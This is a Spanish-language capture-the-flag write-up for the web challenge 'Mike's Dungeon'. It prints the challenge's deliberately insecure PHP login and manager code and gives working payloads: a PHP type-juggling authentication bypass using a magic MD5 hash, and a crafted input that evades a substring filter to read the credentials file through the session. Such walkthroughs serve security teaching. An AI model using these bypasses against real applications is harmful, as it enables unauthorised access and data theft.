### c0r0n4con CTF 2020

##### Challenge: Mike's Dungeon

##### Category: Web

##### Points: 550

##### Solves: 52/362

##### Description: A friend of mine called Mike has just learnt web development. It seems he has created a kind of dungeon, but he is too n00b for you not to steal his flag.

![web550_1](https://user-images.githubusercontent.com/38633962/79078769-d252ad00-7d0a-11ea-960a-3dd8eb10d92a.png)

Tras analizar el código fuente de la aplicación, se identificó el archivo "/mike.txt" gracias al comentario "*&lt;!-- Self-reminder: Dont forget to change your goals in your TXT file. --&gt;*".
```
My goals for 2020:

Tidy my bedroom everyday.
Finish homework everyday.
Change administrator username from mike to hacker1337 to beat all those h4x0rs!
Learn Javascript.
Change password whose sha1 is 0e0776 and more random numbers to admin1337.
Get into http cookie without httponly flag set bounty hunting.

Done:

Learn PHP.
Add debug param to debug index.
Learn Javascript.
```

Con esta información, fue posible otener el código fuente de "index.php" añadiendo el parámetro "debug=1" en nuestra petición:
```php
  <?php
        require_once 'creds.php'; # Including user, pwd and flag variables
        if (isset($_POST[md5('login')]) && isset($_POST['username']) && isset($_POST['password'])) {
            if (strcmp($_POST['username'], sha1(sha1(sha1(sha1(sha1(sha1(sha1(sha1(sha1(sha1(sha1(sha1(sha1(md5(md5(md5($user))))))))))))))))) == 0) { # Are you a crypto nerd?
                if (md5($_POST['password']) == sha1($pwd)) {
                    session_start();
                    if (isset($_SESSION['password'])) {
                        header("Location: manager.php");
                    } else {
                        $_SESSION['password'] = "oooooumama";
                        session_write_close();
                        sleep(2); # No bruteforce :)
                        session_start();
                        unset($_SESSION['password']);
                    }
                } else {
                    die("Hey h4x0r!");
                }
            } else {
                die("Bye h4x0r!");
            }
            # Secret AUTH
            if (md5($_POST['s3cr3t']) === sha1($pwd)) {
                echo $flag;
            }
        }
        if (isset($_GET['debug'])) {
            echo highlight_file(__FILE__, true);
        }
        if(isset($_POST['debug'])) { # Just for debugging
            echo var_dump($_SESSION);
            die();
        }        

    ?>

    <title>Mike's Dungeon</title>
    <h1 style="color: white;"><center>Mike's Dungeon</center></h1>
    <hr><br>

    <center>
        <form method="post" action="<?php basename($_SERVER['PHP_SELF']); ?>" name="signin-form">
            <div class="form-element">
                <label style="color: white;">Username -> </label>
                <input type="password" name="username" required />
            </div>
            <br>
            <div class="form-element">
                <label style="color: white;">Password -> </label>
                <input type="password" name="password" required />
            </div>
            <br>
            <button type="submit" name="login" value="login">Log In</button>
        </form>
    </center>

    <!-- Self-reminder: Dont forget to change your goals in your TXT file. -->

</html>
```

Viendo el codigo fuente y los distintos "==" de las condiciones, se ve claramente que habrá que utilizar "PHP Type Juggling" para bypassear las comprobaciones existentes.

Para saltarse todos los IFs y llegar a la parte central, y que se nos muestre el contendio de SESSION, se puede utilizar el siguiente payload:
```
username=b286db588d77b7f5f7940e24952a14de9b912b51&password=240610708&d56b699830e77ba53855679cb1d252da=1&debug=1
```

En lo anterior, se utiliza "*sha1(sha1(sha1(sha1(sha1(sha1(sha1(sha1(sha1(sha1(sha1(sha1(sha1(md5(md5(md5('mike')))))))))))))))))*" como valor de username (el usuario "*mike*" se obtiene de "*mike.txt*"), el parametro "*d56b699830e77ba53855679cb1d252da*" (como md5 de "login") y el password "*240610708*", ya que *md5("240610708")* es igual a "*0e462097431906509019562988736854*" , lo que en PHP es "*==*" a "*0e0776*" seguido de números (obtenido de "*mike.txt*").

Tras bypassear esto, ya se habrá creado nuestra sesión y podremos acceder a "/manager.php" durante 2 segundos (antes de que se haga el unset del campo "password" de la cookie).

Al acceder a "*/manager.php*" (durante los 2 segundos) sin ningún parametro, se podía obtener el ćodigo fuente de "manager.php" tras decodificarlo dos veces con base64:
```php
<?php

require_once 'creds.php'; # Including user, pwd and flag variables
session_start();

if(!isset($_SESSION['password'])){
    header("Location: index.php?n1c3trY!");
    die();
} else {
    if(!isset($_GET[md5('letmein')])){
        $content = base64_encode(base64_encode(file_get_contents(basename($_SERVER['PHP_SELF']))));
        header("Location: index.php?Have_a_nice_day!$content");
        die();
    }  
}

# Secret Method
if (md5(sha1($_POST['s3cr3t'])) === sha1($pwd)) {
    echo $flag;
}

if(isset($_GET['debug'])) { # Just for debugging
    echo var_dump($_SESSION);
    die();
}

if(isset($_POST['yourinput']) && isset($_POST[sha1($_POST['yourinput'])])) {

    if(strpos($_POST['yourinput'], "/") !== false){
        die("What you trynna doÂ¿?Â¿?");
    }

    $_POST['yourinput'] = strtolower($_POST['yourinput']);

    for($i = 0; $i < 300; ++$i) {
        $_POST['yourinput'] = preg_replace('/ph/', '', preg_replace('/ed/', '', preg_replace('/cr/', '', $_POST['yourinput'])));
    }

    $url = 'http://' . $_POST['yourinput'] . '.txt';

    $file = parse_url($url)[base64_decode("dXNlcg==")];
    $check = parse_url($url)[base64_decode("cGFzcw==")];

    if (empty($file)) {
        die("Get out of here!");
    } else {
        if (empty($check)) {
            die("Come and have a seat.");
        }
    }

    $_SESSION['info'] = base64_encode(file_get_contents($file));
    session_write_close();
    sleep(2); # Bye bye bruteforce
    sleep(0.337); # l33t
    session_start();
    unset($_SESSION['info']);

} else {
    die("Beep Boop!");
}

?>

<html style="background-image: url('img.jpg');">
    <title>SuperSecureVault</title>
    <h1 style="color: white;"><center>Mike's Manager doing management stuff</center></h1>
    <p1 style="color: white;"><center>Hi h4x0r, you are almost there! (Well, this is a self message as nobody will get here :P)<center></p1>
    <br><hr><br>

    <form method="post" action="<?php basename($_SERVER['PHP_SELF']); ?>" name="give me flagg">
        <div class="form-element">
            <label style="color: white;">What you wanna do?</label>
            <br><br>
            <input type="password" name="yourinput" required />
            <br><br>
        </div>
        <button type="submit" name="gooooooo" value="mikeisthebest">Log In</button>
    </form>
</html>

```

En esta segunda parte, vemos que tenenmos que seguir haciendo más "magia" para saltaros los ifs que hay.

El primero de ellos ("*if(!isset($_GET[md5('letmein')]))*") lo podemos saltar haciendo la petición:
```
/manager.php?0d107d09f5bbe40cade3de5c71e9e9b7=1
```

El bloque interesante es el de "yourinput", donde la aplicación nos incluirá en el campo "info" de nuestra sesión, el contenido de un archivo. Concretamente el fichero que se pase como "user" (de '*base64_decode("dXNlcg==")*' )en la petición HTTP".

Como se utiliza "*parse_url* y una petcición HTTP tendrá los siguientes campos "*protocol://user:pass@host:port*", se deberá pasar en el campo "user" el valor "creds.php" (que es el fichero que queremos mostrar).

Como la aplicación busca (y elimina) las cadenas "ph", "ed" y "cr" 300 veces, nos hacemos un script para saltarnos esto y que nos genere el payload necesario para que tras las eliminaciones nos quede "creds.php". Quedando el siguiente payload para enviar como POST a "manager.php":
```
yourinput=cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrreeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddds.ppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppphhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhp:lala@lala.com&9678f73892cc66f3f1df9b404b33d38d984fd02c=1
```

Con esto, obtendremos en la petición a "index.php" el valor "info" de la sesión, que se correspondé al contenido de "creds.php":

![web550_fin1](https://user-images.githubusercontent.com/38633962/79078782-edbdb800-7d0a-11ea-8828-619d8345435d.png)

Tras decodificar este base64, obtendremos el contenido de "creds.php" y el flag esperado: 

```php
<?php

if (basename($_SERVER['PHP_SELF']) === "creds.php") {
    echo '$flag = "flag{H4H4_K33P_Try1nG}"';
    die();
}

$user = "mike";
$pwd = 10932435112;
$flag = "flag{phP_Hypert3xt_Pr3pr0c3ss0r_iS_s3cUr3}";

?>
```

Flag:
```
flag{phP_Hypert3xt_Pr3pr0c3ss0r_iS_s3cUr3} 
```
